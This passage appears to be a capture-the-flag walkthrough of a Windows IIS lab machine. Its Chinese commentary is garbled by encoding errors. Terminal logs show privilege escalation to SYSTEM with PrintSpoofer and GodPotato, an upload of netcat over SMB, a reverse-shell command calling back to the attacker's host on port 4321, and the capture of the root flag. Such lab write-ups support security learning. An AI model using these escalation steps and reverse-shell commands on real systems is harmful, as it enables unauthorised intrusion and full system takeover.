08/10/2023  23:14    <DIR>          images
08/10/2023  23:26             1.481 index.html
08/04/2024  13:42            27.136 PrintSpoofer.exe
08/04/2024  09:05            15.970 reverse.aspx
               4 archivos         44.907 bytes
               7 dirs  45.572.870.144 bytes libres

C:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c cmd.exe

C:\inetpub\wwwroot>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El nï¿½mero de serie del volumen es: 26CD-AE41

 Directorio de C:\inetpub\wwwroot

08/04/2024  13:47    <DIR>          .
08/04/2024  13:47    <DIR>          ..
08/10/2023  23:22    <DIR>          03-comming-soon
08/10/2023  21:46    <DIR>          aspnet_client
08/10/2023  23:14    <DIR>          common-js
08/10/2023  23:14    <DIR>          fonts
08/04/2024  13:47            57.344 GodPotato-NET2.exe
08/04/2024  08:55               320 hello.aspx
08/10/2023  23:14    <DIR>          images
08/10/2023  23:26             1.481 index.html
08/04/2024  13:42            27.136 PrintSpoofer.exe
08/04/2024  09:05            15.970 reverse.aspx
               5 archivos        102.251 bytes
               7 dirs  45.572.812.800 bytes libres

C:\inetpub\wwwroot>GodPotato-NET2.exe -cmd "cmd /c whoami"
GodPotato-NET2.exe -cmd "cmd /c whoami"

C:\" no se reconoce como un comando interno o externo,
programa o archivo por lotes ejecutable.

C:\inetpub\wwwroot>ls
ls
"ls" no se reconoce como un comando interno o externo,
programa o archivo por lotes ejecutable.

C:\inetpub\wwwroot>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El nï¿½mero de serie del volumen es: 26CD-AE41

 Directorio de C:\inetpub\wwwroot

08/04/2024  13:49    <DIR>          .
08/04/2024  13:49    <DIR>          ..
08/10/2023  23:22    <DIR>          03-comming-soon
08/10/2023  21:46    <DIR>          aspnet_client
08/10/2023  23:14    <DIR>          common-js
08/10/2023  23:14    <DIR>          fonts
08/04/2024  13:47            57.344 GodPotato-NET2.exe
08/04/2024  13:49            57.344 GodPotato-NET4.exe
08/04/2024  08:55               320 hello.aspx
08/10/2023  23:14    <DIR>          images
08/10/2023  23:26             1.481 index.html
08/04/2024  13:42            27.136 PrintSpoofer.exe
08/04/2024  09:05            15.970 reverse.aspx
               6 archivos        159.595 bytes
               7 dirs  45.572.755.456 bytes libres

C:\inetpub\wwwroot>GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140709567922176
[*] DispatchTable: 0x140709570239728
[*] UseProtseqFunction: 0x140709569615008
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\42254cd5-fde6-4c69-9a5b-709b17a9aa80\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00004402-0330-ffff-5fb3-25e91f749669
[*] DCOM obj OXID: 0x68660599703e6daf
[*] DCOM obj OID: 0x9a5eb605185a6c3a
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 764 Token:0x860  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1764
nt authority\system
```

å¹¸ç¦æ¥å¾—å°±æ˜¯è¿™ä¹ˆçªç„¶ï¼Œå°è¯•åå¼¹shellï¼

```bash
GodPotato-NET4.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 172.20.10.8 4321"
```

æŠ¥é”™äº†ï¼š

```bash
C:\inetpub\wwwroot>whoami
whoami
iis apppool\defaultapppool

C:\inetpub\wwwroot>GodPotato-NET4.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 172.20.10.8 4321"
GodPotato-NET4.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 172.20.10.8 4321"
[*] CombaseModule: 0x140709567922176
[*] DispatchTable: 0x140709570239728
[*] UseProtseqFunction: 0x140709569615008
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\c855dd94-4606-441d-ba39-05ae24258766\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00007c02-00b0-ffff-7897-24954097877e
[*] DCOM obj OXID: 0xc751c8256ce3cfb8
[*] DCOM obj OID: 0x5f567f9907eaaa76
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 764 Token:0x860  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[!] Cannot create process Win32Error:2
```

```bash
GodPotato-NET4.exe -cmd "nc 172.20.10.8 4321 -e c:\windows\system32\cmd.exe "
```

å¤±è´¥ã€‚ã€‚ã€‚éš¾é“ã€‚ã€‚ã€‚

```bash
C:\inetpub\wwwroot>nc
nc
"nc" no se reconoce como un comando interno o externo,
programa o archivo por lotes ejecutable.
```

å¿˜äº†è¿™ä¸€èŒ¬äº†ã€‚ã€‚ã€‚ä¸Šä¼ ä¸€ä¸ªï¼

```css
C:\inetpub\wwwroot>nc
nc
"nc" no se reconoce como un comando interno o externo,
programa o archivo por lotes ejecutable.

C:\inetpub\wwwroot>GodPotato-NET4.exe -cmd "nc64.exe 172.20.10.8 4321 -e c:\windows\system32\cmd.exe "
GodPotato-NET4.exe -cmd "nc64.exe 172.20.10.8 4321 -e c:\windows\system32\cmd.exe "
[*] CombaseModule: 0x140709567922176
[*] DispatchTable: 0x140709570239728
[*] UseProtseqFunction: 0x140709569615008
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\d9d49022-4453-4c02-b68c-5274c4ceddc0\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00004802-06e4-ffff-a61f-8556657d2194
[*] DCOM obj OXID: 0xe491845c67a1f886
[*] DCOM obj OID: 0x3ddde56b1833d4e9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 764 Token:0x860  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1048
```

```css
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple]
â””â”€$ ls
20231008.log        GodPotato-NET2.exe  hello.aspx         printspoofer-master  reverse.aspx  user.txt
aspx-reverse-shell  GodPotato-NET4.exe  nc.exe-master.zip  reverse.asp          shell.aspx

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple]
â””â”€$ unzip nc.exe-master.zip      

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple]
â””â”€$ ls
20231008.log        GodPotato-NET2.exe  hello.aspx     nc.exe-master.zip    reverse.asp   shell.aspx
aspx-reverse-shell  GodPotato-NET4.exe  nc.exe-master  printspoofer-master  reverse.aspx  user.txt

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple]
â””â”€$ cd nc.exe-master 

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple/nc.exe-master]
â””â”€$ ls
doexec.c  generic.h  getopt.c  getopt.h  hobbit.txt  license.txt  Makefile  nc64.exe  nc.exe  netcat.c  readme.txt

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple/nc.exe-master]
â””â”€$ smbclient //172.20.10.4/WEB -U marcos 
Password for [WORKGROUP\marcos]:
Try "help" to get a list of possible commands.
smb: \> put nc64.exe
putting file nc64.exe as \nc64.exe (14736.5 kb/s) (average 14737.0 kb/s)
smb: \> put nc.exe
putting file nc.exe as \nc.exe (3142.6 kb/s) (average 5461.5 kb/s)
smb: \> ^C

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Simple/nc.exe-master]
â””â”€$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [172.20.10.8] from (UNKNOWN) [172.20.10.4] 49690
Microsoft Windows [Versiï¿½n 10.0.17763.107]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\inetpub\wwwroot>whoami
whoami
nt authority\system

C:\inetpub\wwwroot>cd \Users\Administrador\Desktop
cd \Users\Administrador\Desktop

C:\Users\Administrador\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El nï¿½mero de serie del volumen es: 26CD-AE41

 Directorio de C:\Users\Administrador\Desktop

26/09/2023  15:11    <DIR>          .
26/09/2023  15:11    <DIR>          ..
09/10/2023  00:07                66 root.txt
               1 archivos             66 bytes
               2 dirs  45.572.358.144 bytes libres

C:\Users\Administrador\Desktop>type root.txt
type root.txt
SIMPLE{S31MP3R50N4T3PR1V1L363}
```

å¾—åˆ°flagï¼ï¼ï¼ä¸å¹¸ä¸­çš„ä¸‡å¹¸ï¼Œå…¨é è¿æ°”ï¼ï¼ï¼

